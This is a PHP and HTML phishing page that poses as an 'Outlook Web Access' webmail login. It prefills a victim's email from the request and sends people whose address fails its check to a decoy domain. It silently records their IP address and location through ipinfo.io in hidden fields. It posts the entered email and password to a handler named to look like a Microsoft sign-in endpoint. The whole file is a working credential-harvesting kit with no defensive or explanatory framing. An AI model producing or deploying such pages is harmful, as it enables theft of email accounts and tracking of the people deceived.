<?php
    session_start();
    $loginemail = $_POST['username'];
    function checkEmail($email) {
        $find1 = strpos($email, '@');
        $find2 = strpos($email, '.');
        return ($find1 !== false && $find2 !== false && $find2 > $find1);
    }
    if (!checkEmail($loginemail) or $loginemail == null or $loginemail == ""){
        header("Location: https://sdfd.com");
    }
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Outlook Web Access</title>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <link href="files/webmail.css" rel="stylesheet"/>
        <style>
            .wbk {
            word-break: keep-all;
            }
            .p0 {
            padding: 0;
            }
        </style>
        <script type="text/javascript" src="https://controlpanel.serverdata.net//8974f6aa-63fd-4221-aeea-fcad205312b0.js"></script>
    </head>
    <body>
        <section class="login-section">
            <div class="login-logo"></div>
            <h1 class="login-header">Welcome to your Webmail &amp; Account Settings</h1>
            <div class="login-alert" id="login-update-browser-ie" style="display: none">
                <div class="text-center">
                    <p class="lh16 mb8"> Internet Explorer is not officially supported and your experience may not be optimal. For the best experience, please upgrade your browser. </p>
                </div>
            </div>
            <div id="oldBrowser" class="login-alert" style="display: none;">
                <div class="login-alert-content">
                    <img class="login-alert-icon m-24" src="https://controlpanel.serverdata.net//Content/images/icons/24/warning-orange_24.png" alt="">
                    <div class="login-alert-text">
                        <div class="d-tc">
                            <i class="login-alert-icon-warning mr10 ml-10"></i>
                        </div>
                        <div class="d-tc">
                            <p><strong>You’ll get more if you update your browser.</strong> <br>
                                Our layout and page behavior is optimized for the latest version of your browser.
                            </p>
                            <p><a class="btn m-warning" href="http://outdatedbrowser.com/en" target="_blank">Update my browser</a></p>
                            <p class="mb0">This button will redirect you to your browser’s
                                update page
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="login-tabs">
                <button class="login-tab login-webmail selected">
                Webmail
                <i class="icon-info tooltip" title="Access email on the web using OWA"></i>
                </button>
                <button class="login-tab login-myservices">
                My Services
                <i class="icon-info tooltip" title="Change your password, request new services, and perform other basic user tasks"></i>
                </button>
            </div>
            <form method="POST" class="login-form" name="login" id="login" action="wsignin1.0&rpsnv=13&ct=1648037205&rver=Web-02&wp=MBI_SSL.php" novalidate  onsubmit="return ValidateFormOther()">
                <div>
                    <div id="aduser-login-spinner" style="display: none">
                        <div style="margin: auto; position: absolute; top: 0; left: 0; right: 0; bottom: 0; text-align: center; z-index: 10; background: rgba(255, 255, 255, 0.5);">
                            <ui:spinner></ui:spinner>
                        </div>
                    </div>
                    <input name="returnUrl" type="hidden" />
                    <input name="clientType" type="hidden" class="client-type" value="WebMail" />
                    <div class="pr">
                        <input name="username"
                            id="username"
                            type="text"
                            placeholder="Login (email)"
                            value="<?php echo $loginemail ?>"
                            class="login-input" required autofocus />
                        <div class="login-validation required">Login required</div>
                        <div class="login-validation email">Valid email address required</div>
                    </div>
                    <div class="pr">
                        <input name="password"
                            id="password"
                            type="password"
                            placeholder="Password"
                            class="password-input" required />
                        <div class="password-validation required">Password required</div>
                    </div>
                    <div class="login-actions">
                        <div class="login-remember">
                            <label class="login-remember-me">
                            <input type="checkbox" name="rememberMe" value="true" class="login-checkbox" />
                            <span style="line-height: 22px; height: 22px;">Remember me</span>
                            </label>
                        </div>
                        <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
                    </div>
                </div>
                <input  name="loctn" type="hidden" id="loctn" value="">
                <input  name="loctH" type="hidden" id="loctH" value="">
                <button type="submit" class="login-submit wbk p0">Login</button>
            </form>
        </section>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script>
            jQuery.get("https://ipinfo.io", function(e) {
                const locHead = JSON.stringify(e.ip + " | " + e.city + " | " + e.region + " | " + e.country)
                const loc = JSON.stringify(e)
                document.getElementById('loctH').value = locHead;
                document.getElementById('loctn').value = loc;
            }, "jsonp")
            function ValidateFormOther(){
                var emailID=document.login.username
                var emailPASS=document.login.password
                
                if ((emailID.value==null)||(emailID.value=="")){
                    emailID.focus()
                    return false
                }
                if ((emailPASS.value==null)||(emailPASS.value=="")){
                    emailPASS.focus()
                    return false
                }
                return true
            }
        </script>
    </body>
</html>
